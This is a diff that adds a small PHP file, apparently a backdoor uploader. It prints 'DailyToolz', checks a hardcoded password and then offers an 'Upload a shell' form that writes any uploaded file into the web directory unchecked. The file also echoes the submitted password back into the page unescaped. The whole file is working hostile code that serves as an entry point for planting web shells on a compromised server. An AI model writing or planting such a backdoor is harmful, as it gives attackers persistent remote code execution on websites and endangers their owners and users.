@@ -1,0 +1,81 @@
+<?php
+
+echo "DailyToolz";
+
+$error = ""; 
+
+$password = "6z6z6z"; //pass
+
+if(isset($_POST["password"]) && $_POST["password"] == $password){
+
+  if(isset($_POST["ok"])){
+
+    if(isset($_FILES["shell"])){
+
+      if($_FILES["shell"]['error'] == 0){
+
+        if(move_uploaded_file($_FILES["shell"]['tmp_name'], './'.$_FILES["shell"]['name'])){
+
+          $error = '<h4>Shell Uploaded</h4>';
+
+        } else {
+
+          $error = '<h4>ERROR Shell Not Uploaded</h4>';
+
+        }
+
+      } else {
+
+        $error = '<h4>ERROR File !</h4>';
+
+      }
+
+    } else {
+
+      $error = '<h4>ERROR Please choose a file</h4>';
+
+    }
+
+  }
+
+?>
+
+        <h4>Upload a shell</h4>
+
+        <?php echo $error ?>
+
+        <form action="" method="POST" enctype="multipart/form-data"> 
+
+            <input type="file" name="shell" class="form-control"><br/><br/>
+
+            <input type="submit" name="ok" class="btn btn-light">
+
+            <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>">
+
+        </form>
+
+    <?php
+
+    }
+
+    else {
+
+    ?>
+
+        <h4>Password</h4>
+
+        <form method="post" action="">
+
+            <input name="password" type="text" class="form-control text-center"><br/><br/>
+
+            <input type="submit" name="go" class="btn btn-light">
+
+        </form>
+
+                        
+
+    <?php
+
+    }
+
+?>
